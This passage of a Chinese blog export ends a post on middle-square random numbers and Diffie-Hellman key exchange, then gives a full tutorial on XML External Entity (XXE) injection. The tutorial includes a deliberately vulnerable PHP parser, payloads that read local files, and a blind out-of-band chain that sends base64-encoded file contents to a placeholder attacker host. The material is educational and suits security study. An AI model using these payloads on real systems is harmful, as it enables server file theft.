<p>这个方法叫做 “中间平方”</p>
<p>生成的随机数序列的随机性依赖于最初种子的随机性，同样的种子，导致同样的序列，所以，随机生成的序列区别于伪随机生成的序列的实质是什么？</p>
<p>中间平方的生成会有一个周期，但是当“种子”的长度增加，就会加大这个周期</p>
<p>与之同时带来一个问题，如何分享这个随机数的种子</p>
<h5 id="Diffie-Hellman密钥交换原理："><a href="#Diffie-Hellman密钥交换原理：" class="headerlink" title="Diffie-Hellman密钥交换原理："></a>Diffie-Hellman密钥交换原理：</h5><p><img src="https://pic3.zhimg.com/80/5d668818881609c8543e6efa7c0d6af1_720w.jpg" alt=""></p>
<p>上图很经典<br>它的数学基础就是离散对数这个数学难题。用它进行密钥交换的过程简述如下： </p>
<p>选取两个大数p和g并公开，其中p是一个素数，g是p的一个<strong>模p本原单位根(primitive root module p)</strong>，所谓<strong>本原单位根</strong>就是指在<strong>模p乘法运算下</strong>，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1； </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">对于Alice(其中的一个通信者)，随机产生一个整数<span class="keyword">a</span>，<span class="keyword">a</span>对外保密，计算Ka = g^<span class="keyword">a</span> <span class="keyword">mod</span> p，将Ka发送给Bob；</span><br><span class="line"></span><br><span class="line">对于Bob(另一个通信者)，随机产生一个整数b，b对外保密，计算Kb = g^b <span class="keyword">mod</span> p，将Kb发送给Alice； </span><br><span class="line"></span><br><span class="line">在Alice方面，收到Bob送来的Kb后，计算出密钥为：key = Kb^<span class="keyword">a</span> <span class="keyword">mod</span> p = g^(b*<span class="keyword">a</span>) <span class="keyword">mod</span> p <span class="keyword">mod</span> p； </span><br><span class="line"></span><br><span class="line">对于Bob，收到Alice送来的Ka后，计算出密钥为：key = Ka ^ b <span class="keyword">mod</span> p = g^(<span class="keyword">a</span>*b) <span class="keyword">mod</span> p <span class="keyword">mod</span> p。</span><br><span class="line"></span><br><span class="line">攻击者知道p和g，并且截获了Ka和Kb，但是当它们都是非常大的数的时候，依靠这四个数来计算<span class="keyword">a</span>和b非常困难，这就是离散对数数学难题。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">（1）Alice与Bob确定两个大素数n和g，这两个数不用保密 </span><br><span class="line">（2）Alice选择另一个大随机数x，并计算A如下：<span class="attribute">A</span>=g^xmod n </span><br><span class="line">（3）Alice将A发给Bob </span><br><span class="line">（4）Bob  选择另一个大随机数y，并计算B如下：<span class="attribute">B</span>=g^ymod n </span><br><span class="line">（5）Bob将B发给Alice </span><br><span class="line">（6）计算秘密密钥K1如下：<span class="attribute">K1</span>=B^xmod n </span><br><span class="line">（7）计算秘密密钥K2如下：<span class="attribute">K2</span>=A^ymod n  <span class="attribute">K1</span>=K2，因此Alice和Bob可以用其进行加解密</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>密码学</category>
        <category>对称加密</category>
      </categories>
      <tags>
        <tag>对称加密</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞原理</title>
    <url>/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>[TOC]</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<p>xxe漏洞主要针对web-service危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等．首先存在漏洞的web服务一定是存在xml传输数据的，可以在http头的content-type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）．或者一些常见的采用xml的java服务配置文件（spring，struts2）．不过现实中存在的大多数xxe漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机．</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul>
<li>XML</li>
<li>DTD</li>
</ul>
<h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p>XML 指可扩展标记语言（eXtensible Markup  Language）。</p>
<p>XML 被设计用来传输和存储数据。</p>
<p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p>
<p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p>
<p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。（这里不解释js如何读取xml数据）</p>
<h4 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><p>这是一个xml结构：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>            	    //这一行是 XML 文档定义</span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>                                               //定义一个根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span>                             //定义子元素receiver的内容为Myself</span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span>                                //同上</span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span>                            //同上</span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span>                      //同上</span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span>                                              //根元素结尾标签</span><br></pre></td></tr></table></figure></div>

<p>如果使用DTD来定义：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>                                   //这一行是 XML 文档定义</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [                                     //定义一个根元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> (<span class="meta-keyword">receiver</span> ,<span class="meta-keyword">sender</span> ,<span class="meta-keyword">header</span> ,<span class="meta-keyword">msg</span>)&gt;</span>      //定义根元素包含的子元素，通过圆括号定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">receiver</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                           //定义子元素(#PCDATA)表示只有数据的元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">sender</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                             //同上 </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">header</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">msg</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//紧跟在XML标头之后，是文档类型声明，通常称为`DOCTYPE`</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//DOCTYPE声明后跟DTD的主体，可以在主体中声明 "元素"，"属性"，"实体" 和 "符号" </span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//方括号[]包含一个称为内部子集的可选实体声明列表。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//带有一个或多个子元素的元素通过圆括号中的子元素名进行声明</span></span><br></pre></td></tr></table></figure></div>

<p>DTD语法<br>所有DTD元素声明都有这种一般形式 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><figcaption><span>elementname (content)></span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT elementname (content)&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>ELEMENT</code>声明用于指示要定义元素的解析器。</p>
</li>
<li><p><code>elementname</code>是定义的元素名称(也称为通用标识符)。</p>
</li>
<li><p><code>content</code>定义了元素中可以包含的内容(如果有的话)。</p>
</li>
</ul>
<h3 id="什么是实体注入"><a href="#什么是实体注入" class="headerlink" title="什么是实体注入"></a>什么是实体注入</h3><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了能标签以外，还需要有些内容是固定的</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">"test"</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明</span><br><span class="line">//通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合</span><br></pre></td></tr></table></figure></div>

<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
<h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/test.dtd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p>
<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
<h4 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h4><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p>
<p><strong>1.通用实体</strong></p>
<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/win.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>2.参数实体：</strong></p>
<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)<font color=red>只有在 DTD 文件中，参数实体的声明才能引用其他实体</font><br>(3)和通用实体一样，参数实体也可以外部引用</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">an-element</span> <span class="meta-string">"&lt;!ELEMENT mytag (subtag)&gt;"</span>&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote-dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://somewhere.example.org/remote.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="perl">%an-element; %remote-dtd;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>抛砖：</strong></p>
<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
<h4 id="我们能做什么？"><a href="#我们能做什么？" class="headerlink" title="我们能做什么？"></a>我们能做什么？</h4><p>上面疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p>
<p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/test.dtd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p>
<h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p>
<p>本地服务器上放上解析 XML 的 php 代码：</p>
<p><strong>示例代码：</strong></p>
<p><strong>xml.php</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);             <span class="comment">//关闭禁用xml外部实体</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>); </span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();                         <span class="comment">//创建xml对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     </span><br><span class="line">    $creds = simplexml_import_dom($dom);               </span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//file_get_contents() 函数把整个文件读入一个字符串中。php://input 是个可以访问请求的原始数据的只读流。</span></span><br><span class="line">这里相当于获取post过去的xml代码</span><br><span class="line"><span class="comment">//loadxml加载xml代码</span></span><br><span class="line"><span class="comment">//LIBXML_NOENT: 将 XML中的实体引用替换成对应的值</span></span><br><span class="line"><span class="comment">//LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span></span><br><span class="line"><span class="comment">//simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload:</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>结果如下图：</strong></p>
<p><img src="https://i.imgur.com/3MhyU4U.png" alt=""></p>
<p>成功读取system.in文件内容</p>
<p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p>
<p><strong>如图所示：</strong></p>
<p><img src="https://i.imgur.com/LxYOrGA.png" alt=""></p>
<p><strong>结果如下图：</strong></p>
<p><img src="https://i.imgur.com/XGXPp9F.png" alt=""></p>
<p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下：</p>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以输入任意字符除了 ]]&gt; 不能嵌套</p>
<p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/system.ini"</span>&gt;</span> ]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 <code>&lt;![CDATA[&quot; 和 &quot;]]&gt;</code>,但是好像没有任何语法告诉我们字符串能拼接的。</p>
<p><strong>使用参数实体引用其他实体</strong></p>
<p><strong>payload:</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///d:/test.txt"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/evil.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>evil.dtd</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">"%start;%goodies;%end;"</span>&gt;</span>            //引用start，goodies，end实体内容，CDATA输出</span><br><span class="line"></span><br><span class="line">//参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾。一般实体的定义无%开头，引用以&amp;开头，以;结尾</span><br></pre></td></tr></table></figure></div>

<p><strong>结果如图：</strong></p>
<p><img src="https://i.imgur.com/rPu8UmV.png" alt=""></p>
<h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><h4 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a>新的问题出现</h4><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p>
<h4 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a>新的解决方法</h4><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p>
<p><strong>xml.php</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">libxml_disable_entity_loader (<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p><strong>test.dtd</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64 encode/resource=file:///D:/test.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37 send SYSTEM 'http://ip:9999?p=%file;'&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//因为实体的值中不能有 %, 所以讲send前的 “%” 转换成html实体编码 “&amp;#37”;</span><br></pre></td></tr></table></figure></div>

<p><strong>payload：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>结果如图：</strong></p>
<p>环境问题，先不搭了。。。。。。。</p>
<p><strong>整个调用过程：</strong></p>
<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件（file传入到send的过程中已经执行，传入到send是已经得到的值），然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
